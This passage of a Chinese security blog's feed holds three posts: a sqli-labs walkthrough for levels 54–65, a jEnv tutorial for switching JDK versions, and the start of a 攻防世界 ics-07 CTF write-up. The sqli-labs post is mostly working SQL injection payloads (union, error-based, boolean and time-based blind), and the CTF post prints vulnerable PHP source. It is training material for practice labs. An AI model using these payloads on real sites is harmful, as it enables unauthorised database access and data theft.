class="line">?sort&#x3D;1        # 正常回显</span><br><span class="line">?sort&#x3D;1--+     # 正常回显</span><br><span class="line">?sort&#x3D;1&#39;       # 不显示</span><br><span class="line">?sort&#x3D;1&#39;--+    # 正常显示</span><br><span class="line"></span><br><span class="line"># 验证</span><br><span class="line">?sort&#x3D;1&#39; or sleep(3)--+ # 无延时</span><br><span class="line">?sort&#x3D;0&#39; or sleep(3)--+ # 有明显延时</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="5-进阶挑战-54-65"><a href="#5-进阶挑战-54-65" class="headerlink" title="5 进阶挑战(54-65)"></a>5 进阶挑战(54-65)</h1><h2 id="less-54"><a href="#less-54" class="headerlink" title="less-54"></a>less-54</h2><p>闭合方式：<code>id=&#39;$id&#39;</code></p><p>判断闭合方式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?id&#x3D;1&#39;--+</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>判断字段数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?id&#x3D;1&#39; order by 3--+</span><br><span class="line">?id&#x3D;1&#39; order by 4--+</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>查看回显的字段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?id&#x3D;-1&#39; union select 1,2,3 --+</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>查询表名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?id&#x3D;-1&#39; union select 1,2,(SELECT+GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA&#x3D;DATABASE()) --+</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>查询结果为<code>HLBSTFO6HB</code>，结果不唯一<br>查询列名（记得修改表名为上面的查询结果）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?id&#x3D;-1&#39; union select 1,2,(SELECT+GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME&#x3D;0x484c425354464f364842)--+</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>列名为：id、secret_XBJJ、sessid、tryy<br>查询表中的数据（修改字段名、表名）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?id&#x3D;-1&#39; union select 1,2,(SELECT+GROUP_CONCAT(secret_XBJJ)+FROM+HLBSTFO6HB)--+</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最后查到key值为：<code>kRTCQUzl170VXBxrCqlTWuyZ</code></p><hr><h2 id="less-55"><a href="#less-55" class="headerlink" title="less-55"></a>less-55</h2><p>闭合方式：<code>id=($id)</code><br>Less-55 给了 14 次尝试机会，代码基本上没有变化，只是闭合方式发生了变化。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 验证</span><br><span class="line">?id&#x3D;1) --+</span><br><span class="line"></span><br><span class="line"># 查询表名</span><br><span class="line">?id&#x3D;-1) union select 1,2,(SELECT+GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA&#x3D;DATABASE()) --+</span><br><span class="line"># P0ULLTHD09</span><br><span class="line"></span><br><span class="line"># 查询字段名</span><br><span class="line">?id&#x3D;-1) union select 1,2,(SELECT+GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME&#x3D;&#39;P0ULLTHD09&#39;)--+</span><br><span class="line"># id、sessid、secret_0SEC、tryy</span><br><span class="line"></span><br><span class="line"># 查询key值</span><br><span class="line">?id&#x3D;-1) union select 1,2,(SELECT+GROUP_CONCAT(secret_0SEC)+FROM+P0ULLTHD09)--+</span><br><span class="line"># hSoUfCvuUNHhjG8CQInhuVv2</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h2 id="less-56"><a href="#less-56" class="headerlink" title="less-56"></a>less-56</h2><p>闭合方式：<code>id=(&#39;$id&#39;)</code></p><p>闭合方式不同。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 查询表名</span><br><span class="line">?id&#x3D;-1&#39;) union select 1,2,(SELECT+GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA&#x3D;DATABASE()) --+</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h2 id="less-57"><a href="#less-57" class="headerlink" title="less-57"></a>less-57</h2><p>闭合方式：<code>id=(&#39;$id&#39;)</code></p><p>闭合方式不同。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 查询表名</span><br><span class="line">?id&#x3D;-1&quot; union select 1,2,(SELECT+GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA&#x3D;DATABASE()) --+</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h2 id="less-58"><a href="#less-58" class="headerlink" title="less-58"></a>less-58</h2><p>闭合方式：<code>id=&#39;$id&#39;</code></p><p>uname 和 pass 都只输出数组中的结果，union 查询无法回显。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$unames=<span class="keyword">array</span>(<span class="string">&quot;Dumb&quot;</span>,<span class="string">&quot;Angelina&quot;</span>,<span class="string">&quot;Dummy&quot;</span>,<span class="string">&quot;secure&quot;</span>,<span class="string">&quot;stupid&quot;</span>,<span class="string">&quot;superman&quot;</span>,<span class="string">&quot;batman&quot;</span>,<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;admin1&quot;</span>,<span class="string">&quot;admin2&quot;</span>,<span class="string">&quot;admin3&quot;</span>,<span class="string">&quot;dhakkan&quot;</span>,<span class="string">&quot;admin4&quot;</span>);</span><br><span class="line">$pass = ($unames);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your Login name : &#x27;</span>. $unames[$row[<span class="string">&#x27;id&#x27;</span>]];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your Password : &#x27;</span> .$pass[$row[<span class="string">&#x27;id&#x27;</span>]];</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>但是可以输出报错信息，可以尝试进行报错注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?id&#x3D;1&#39;+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(CONCAT(secret_OD68 )+AS+CHAR),0x7e))+FROM+WOO6ID239T+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)--+</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="less-59"><a href="#less-59" class="headerlink" title="less-59"></a>less-59</h2><p>闭合方式：<code>id=$id</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 猜测闭合方式</span><br><span class="line">?id&#x3D;1        # 正常显示</span><br><span class="line">?id&#x3D;1--+     # 正常显示</span><br><span class="line">?id&#x3D;1&#39;       # 报错</span><br><span class="line">?id&#x3D;1&#39;--+    # 报错</span><br><span class="line"></span><br><span class="line"># 验证</span><br><span class="line">?id&#x3D;0 or sleep(3) --+ # 有明显延时</span><br><span class="line">?id&#x3D;1 or sleep(3) --+ # 无延时</span><br><span class="line"></span><br><span class="line"># 报错注入</span><br><span class="line">?id&#x3D;0 or updatexml(1, concat(0x7e, database(), 0x7e), 1)--+</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h2 id="less-60"><a href="#less-60" class="headerlink" title="less-60"></a>less-60</h2><p>闭合方式：<code>id=（&quot;$id&quot;）</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 猜测闭合方式</span><br><span class="line">?id&#x3D;1        # 正常显示（强制类型转化为1）</span><br><span class="line">?id&#x3D;1--+     # 正常显示（强制类型转化为1）</span><br><span class="line">?id&#x3D;1&#39;       # 正常显示（强制类型转化为1）</span><br><span class="line">?id&#x3D;1&#39;--+    # 正常显示（强制类型转化为1）</span><br><span class="line">?id&#x3D;1&quot;       # 报错,并能看到需要添加括号。</span><br><span class="line">?id&#x3D;1&quot;) --+  # 正常显示</span><br><span class="line"></span><br><span class="line"># 报错注入</span><br><span class="line">?id&#x3D;0&quot;) or updatexml(1, concat(0x7e, database(), 0x7e), 1)--+</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h2 id="less-61"><a href="#less-61" class="headerlink" title="less-61"></a>less-61</h2><p>闭合方式：<code>id=((&#39;$id&#39;))</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 猜测闭合方式（自己手动多次后，可以考虑采用Burp Suite+字典进行测试）</span><br><span class="line">?id&#x3D;1&#39;         # 报错，并且看到需要添加双层括号</span><br><span class="line">?id&#x3D;1&#39;)) --+   # 正常显示</span><br><span class="line"></span><br><span class="line"># 报错注入</span><br><span class="line">?id&#x3D;0&#39;)) or updatexml(1, concat(0x7e, database(), 0x7e), 1)--+</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h2 id="less-62"><a href="#less-62" class="headerlink" title="less-62"></a>less-62</h2><p>闭合方式：<code>id=(&#39;$id&#39;)</code></p><p>不能报错注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 猜测闭合方式(在猜测时，最好列举一个比较全面的闭合方式来猜测)</span><br><span class="line">?id&#x3D;1        # 正常显示</span><br><span class="line">?id&#x3D;1&#39;       # 报错（显示</span><br><span class="line">?id&#x3D;1&#39;)--+   # 正常显示</span><br><span class="line"></span><br><span class="line"># 验证</span><br><span class="line">?id&#x3D;0&#39;) or sleep(3)--+</span><br><span class="line"></span><br><span class="line"># 布尔注入</span><br><span class="line">?id&#x3D;0&#39;) or if(left(database(), 1)&#x3D;&#39;s&#39;, 1, 0)--+    # 不显示</span><br><span class="line">?id&#x3D;0&#39;) or if(left(database(), 1)&#x3D;&#39;c&#39;, 1, 0)--+    # 正常显示</span><br><span class="line">?id&#x3D;0&#39;) or if(left(database(), 2)&#x3D;&#39;ch&#39;, 1, 0)--+   # 正常显示</span><br><span class="line"></span><br><span class="line"># 延时注入</span><br><span class="line">?id&#x3D;0&#39;) or if(left(database(), 1)&#x3D;&#39;s&#39;, sleep(3), 0)--+    # 不显示</span><br><span class="line">?id&#x3D;0&#39;) or if(left(database(), 1)&#x3D;&#39;c&#39;, sleep(3), 0)--+    # 明显延时</span><br><span class="line">?id&#x3D;0&#39;) or if(left(database(), 2)&#x3D;&#39;ch&#39;, sleep(3), 0)--+   # 明显延时</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h2 id="less-63"><a href="#less-63" class="headerlink" title="less-63"></a>less-63</h2><p>闭合方式：<code>id=&#39;$id&#39;</code></p><p>类似less-62</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 猜测闭合方式</span><br><span class="line">?id&#x3D;1        # 正常显示</span><br><span class="line">?id&#x3D;1&#39;       # 报错</span><br><span class="line">?id&#x3D;1&#39;--+    # 正常显示</span><br><span class="line"></span><br><span class="line"># 验证</span><br><span class="line">?id&#x3D;0&#39; or sleep(3)--+</span><br><span class="line"></span><br><span class="line"># 布尔注入</span><br><span class="line">?id&#x3D;0&#39; or if(left(database(), 1)&#x3D;&#39;s&#39;, 1, 0)--+    # 不显示</span><br><span class="line">?id&#x3D;0&#39; or if(left(database(), 1)&#x3D;&#39;c&#39;, 1, 0)--+    # 正常显示</span><br><span class="line">?id&#x3D;0&#39; or if(left(database(), 2)&#x3D;&#39;ch&#39;, 1, 0)--+   # 正常显示</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h2 id="less-64"><a href="#less-64" class="headerlink" title="less-64"></a>less-64</h2><p>闭合方式：<code>id=(($id))</code></p><p>类似less-62</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 验证</span><br><span class="line">?id&#x3D;0)) or sleep(3)--+    # 明显延时</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="less-65"><a href="#less-65" class="headerlink" title="less-65"></a>less-65</h2><p>闭合方式：<code>id=(&quot;$id&quot;)</code></p><p>类似less-62</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 验证</span><br><span class="line">?id&#x3D;0&quot;) or sleep(3)--+    # 明显延时</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="6-思维导图"><a href="#6-思维导图" class="headerlink" title="6 思维导图"></a>6 思维导图</h1><p>自己总结的思维导图。如果有更好的想法，欢迎和我交流<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210115123359.png"></p><p>幕布地址：<a href="https://share.mubu.com/doc/qV0gisrYy6">https://share.mubu.com/doc/qV0gisrYy6</a></p><h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><p>参考教程：</p><ol><li><a href="https://blog.csdn.net/qq_41420747/article/details/81836327">sqli-lab教程——1-35通关Writeup-地址ch3nye.top</a></li><li><a href="https://www.sqlsec.com/2020/05/sqlilabs.html">SQLI labs 靶场精简学习记录-国光</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> 网络空间安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MacOS切换JDK版本的最佳姿势</title>
      <link href="38f31199edc1/"/>
      <url>38f31199edc1/</url>
      
        <content type="html"><![CDATA[<p>jEnv 是 MacOS 一个管理 Java 版本的开源工具，这是它的<a href="https://www.jenv.be/">官方文档</a>，同时支持 Linux 和 MacOS。我最近在更新 Burp Suite 的时候用到了这个工具觉得挺不错的。</p><h1 id="1-安装"><a href="#1-安装" class="headerlink" title="1 安装"></a>1 安装</h1><p>Linux / OS X</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/jenv/jenv.git ~/.jenv</span><br></pre></td></tr></table></figure><p>Mac OS 使用 Homebrew 安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ brew install jenv</span><br></pre></td></tr></table></figure><h1 id="2-基本用法"><a href="#2-基本用法" class="headerlink" title="2 基本用法"></a>2 基本用法</h1><p>jEnv 并不具备安装 Java 版本和删除版本的功能，只是省去了像<a href="https://juejin.cn/post/6871959224314757134">这个教程</a>一样配置环境变量的麻烦，所以教程中依然使用 HomeBrew 安装 JDK。</p><h2 id="2-1-JDK安装"><a href="#2-1-JDK安装" class="headerlink" title="2.1 JDK安装"></a>2.1 JDK安装</h2><p>2019 年之后, Oracle 对 Java 的商业模式进行了一系列改革, 多种版本的 JDK 开始出现在开发者的视野中.</p><p>整体来看, 存在三个版本的 JDK, 分别是 <strong>Oracle JDK</strong>、<strong>Oracle 编译的 OpenJDK <strong>和</strong>第三方厂商编译的 OpenJDK</strong>. 其实三者在功能上并<strong>没有明显的差异</strong>。</p><p>其中 OpenJDK 提供的版本更为全面，AdoptOpenJDK 是完全免费的、无品牌的 OpenJDK 版本，基于 GPL 开源协议(+Classpath Extension), 以免费软件的形式提供社区版的 OpenJDK 二进制包, 公司也可安全且放心使用。</p><p>即使用下面的命令即可安装各种版本的 jdk。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 选择自己需要的版本</span></span><br><span class="line">$ brew install AdoptOpenJDK/openjdk/adoptopenjdk8</span><br><span class="line">$ brew install AdoptOpenJDK/openjdk/adoptopenjdk9</span><br><span class="line">$ brew install AdoptOpenJDK/openjdk/adoptopenjdk10</span><br><span class="line">$ brew install AdoptOpenJDK/openjdk/adoptopenjdk11</span><br><span class="line">$ brew install AdoptOpenJDK/openjdk/adoptopenjdk12</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装最新版本 OpenJDK</span></span><br><span class="line">$ brew install AdoptOpenJDK/openjdk/adoptopenjdk</span><br></pre></td></tr></table></figure><p>安装目录通常在<code>/Library/Java/JavaVirtualMachines</code>下，在配置 jEnv 的时候需要使用 JDK 的 HOME 目录。</p><h2 id="2-2-配置jEnv"><a href="#2-2-配置jEnv" class="headerlink" title="2.2 配置jEnv"></a>2.2 配置jEnv</h2><p>查看当前 jEnv 可管理的 Java 版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ jenv versions</span><br><span class="line">  system</span><br><span class="line">  oracle64-1.6.0.39</span><br><span class="line">* oracle64-1.7.0.11 (<span class="built_in">set</span> by /Users/hikage/.jenv/version)</span><br></pre></td></tr></table></figure><p>将 JDK 的 HOME 目录添加到 jEnv 中，只需要添加一次，以后就可以秒换 Java 环境。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ jenv add /Library/Java/JavaVirtualMachines/adoptopenjdk-8.jdk/Contents/Home</span><br></pre></td></tr></table></figure><p>再次使用<code>jenv versions</code>后，就可以看到刚刚添加的 Java 的版本号。</p><h2 id="2-3-切换-Java-版本"><a href="#2-3-切换-Java-版本" class="headerlink" title="2.3 切换 Java 版本"></a>2.3 切换 Java 版本</h2><p>配置全局的 JDK 版本，把下面的<code>oracle64-1.6.0.39</code>替换成你的 jEnv 列出的 JDK 的版本信息。（如果不确定的话，可以到最下面看效果图）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ jenv global oracle64-1.6.0.39</span><br></pre></td></tr></table></figure><p>配置局部的 JDK 版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ jenv <span class="built_in">local</span> oracle64-1.6.0.39</span><br></pre></td></tr></table></figure><h1 id="3-最后的效果"><a href="#3-最后的效果" class="headerlink" title="3 最后的效果"></a>3 最后的效果</h1><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210104200111.png"></p><p>参考博客：</p><ol><li><a href="https://www.cnblogs.com/imzhizi/p/macos-jdk-installation-homebrew.html">https://www.cnblogs.com/imzhizi/p/macos-jdk-installation-homebrew.html</a></li><li><a href="https://www.jianshu.com/p/1a147d5515f0">https://www.jianshu.com/p/1a147d5515f0</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> 高效率工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界-ics-07</title>
      <link href="6ec69d06f1fc/"/>
      <url>6ec69d06f1fc/</url>
      
        <content type="html"><![CDATA[<h1 id="1-源码审计"><a href="#1-源码审计" class="headerlink" title="1 源码审计"></a>1 源码审计</h1><p>打开网站进行体验过后，发现在「项目管理」位置可以点击，进入后可以查看该网页的源码。使用F12后并无其他异常情况。使用 dirsearch进行扫目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[10:11:59] 302 -    1KB - &#x2F;index.php  -&gt;  ?page&#x3D;flag.php</span><br><span class="line">[10:11:59] 200 -   74B  - &#x2F;flag.php</span><br><span class="line">[10:11:59] 200 -    0B  - &#x2F;config.php</span><br><span class="line">[10:11:59] 200 -    5KB - &#x2F;index.html</span><br></pre></td></tr></table></figure><p>对网站的源码进行大致的分析，并进行注释。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;cetc7&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    session_start();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置未page参数</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[page])) &#123;</span><br><span class="line">        show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 设置page参数，并且page不等于index.php</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[page]) &amp;&amp; $_GET[page] != <span class="string">&#x27;index.php&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        header(<span class="string">&#x27;Location: ?page=flag.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">    &lt;!-- page和id的表单 --&gt;</span><br><span class="line">    &lt;form action=<span class="string">&quot;#&quot;</span> method=<span class="string">&quot;get&quot;</span>&gt;</span><br><span class="line">        page : &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;page&quot;</span> value=<span class="string">&quot;&quot;</span>&gt;</span><br><span class="line">        id : &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;id&quot;</span> value=<span class="string">&quot;&quot;</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;br /&gt;</span><br><span class="line">    &lt;a href=<span class="string">&quot;index.phps&quot;</span>&gt;view-source&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> ($_SESSION[<span class="string">&#x27;admin&#x27;</span>]) &#123;</span><br><span class="line">        $con = $_POST[<span class="string">&#x27;con&#x27;</span>];</span><br><span class="line">        $file = $_POST[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        $filename = <span class="string">&quot;backup/&quot;</span> . $file;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/.+\.ph(p[3457]?|t|tml)$/i&#x27;</span>, $filename)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Bad file extension&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            chdir(<span class="string">&#x27;uploaded&#x27;</span>);</span><br><span class="line">            $f = fopen($filename, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">            fwrite($f, $con);</span><br><span class="line">            fclose($f);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"> </span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// 设置id参数、id不等于1、id的倒数第一个位置为9</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[id]) &amp;&amp; floatval($_GET[id]) !== <span class="string">&#x27;1&#x27;</span> &amp;&amp; substr($_GET[id], <span class="number">-1</span>) === <span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line">        $id = mysql_real_escape_string($_GET[id]);</span><br><span class="line">        $sql = <span class="string">&quot;select * from cetc007.user where id=&#x27;<span class="subst">$id</span>&#x27;&quot;</span>;</span><br><span class="line">        $result = mysql_query($sql);</span><br><span class="line">        $result = mysql_fetch_object($result);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $result = <span class="literal">False</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!$result) <span class="keyword">die</span>(<span class="string">&quot;&lt;br &gt;something wae 